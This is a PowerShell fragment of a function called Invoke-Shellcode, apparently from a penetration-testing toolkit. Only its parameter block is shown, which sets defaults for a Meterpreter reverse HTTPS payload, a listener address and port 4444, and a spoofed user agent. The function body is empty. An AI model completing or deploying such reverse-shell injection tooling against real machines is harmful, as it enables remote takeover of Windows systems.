function Invoke-Shellcode
{

[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProcessID,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
 #   [Parameter( ParameterSetName = 'Metasploit' )]
  #  [ValidateSet( 'windows/meterpreter/reverse_http',
   #               'windows/meterpreter/reverse_https',
    #              IgnoreCase = $True )]
    [String]
    $Payload = 'windows/meterpreter/reverse_https',
    
    [Parameter( ParameterSetName = 'ListPayloads' )]
    [Switch]
    $ListMetasploitPayloads,
    
    [Parameter( Mandatory = $True,
                ParameterSetName = 'Metasploit' )]
    [ValidateNotNullOrEmpty()]
    [String]
    $Lhost = '192.168.223.135',
    
    [Parameter( Mandatory = $True,
                ParameterSetName = 'Metasploit' )]
    [ValidateRange( 1,65535 )]
    [Int]
    $Lport = 4444,
    
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [String]
    $UserAgent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    
    [Switch]
    $Force = $False
)
}
